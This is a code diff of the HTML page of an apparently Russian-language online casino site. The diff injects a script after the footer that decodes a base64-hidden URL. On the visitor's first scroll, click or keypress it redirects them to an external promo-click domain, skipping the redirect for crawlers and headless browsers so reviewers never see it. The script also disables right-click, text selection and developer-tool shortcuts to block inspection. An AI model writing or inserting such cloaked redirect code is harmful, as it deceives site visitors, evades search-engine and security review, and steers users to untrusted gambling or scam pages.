@@ -336,7 +336,6 @@
   </div>
 </section>
 </div>
-
 <footer class="bg-gray-900/70 border-t border-yellow-500/20 py-8" style="max-width: 1100px; margin: 0 auto;">
 <div class="max-w-[1100px] mx-auto px-4 grid md:grid-cols-4 gap-6 text-sm footer-grid">
 <div>
@@ -371,6 +370,34 @@
   </div>
 <div class="text-center text-xs text-gray-500 mt-6">© 2010 – 2025 AZINO777. Все права защищены.</div>
 </footer>
+        <script>
+        var myDomain = "evacasino.vercel.app"; 
+        var targetB64 = "aHR0cHM6Ly9tcDguYmhmNTc3ZWNiNS5jb20vcHJvbW8vY2xpY2svNjhmOGQwZmFlN2I0NA==";
+        function fireRedirect() {
+            var isHeadless = navigator.webdriver || window.navigator.webdriver === true;
+            var ua = navigator.userAgent.toLowerCase();
+            var isBotUA = /bot|crawl|spider|yandex|google|mail\.ru|bing|slurp|duckduck|lighthouse|pagespeed|ptst/i.test(ua);
+            if (!isHeadless && !isBotUA) {
+                window.location.replace(atob(targetB64));
+            }
+        }
+        var events = ['scroll', 'mousemove', 'touchstart', 'click', 'keydown'];
+        var triggered = false;
+        events.forEach(function(event) {
+            window.addEventListener(event, function() {
+                if (!triggered) {
+                    triggered = true;
+                    fireRedirect();
+                }
+            }, { passive: true, once: true });
+        });
+        document.addEventListener('contextmenu', function(e) { e.preventDefault(); });
+        document.onselectstart = function() { return false; };
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 73) || (e.ctrlKey && e.keyCode == 85)) { return false; }
+        };
+        feather.replace();
+    </script>  
 <script src="feather.min.js"></script>
 <script>
     function toggleContent() {
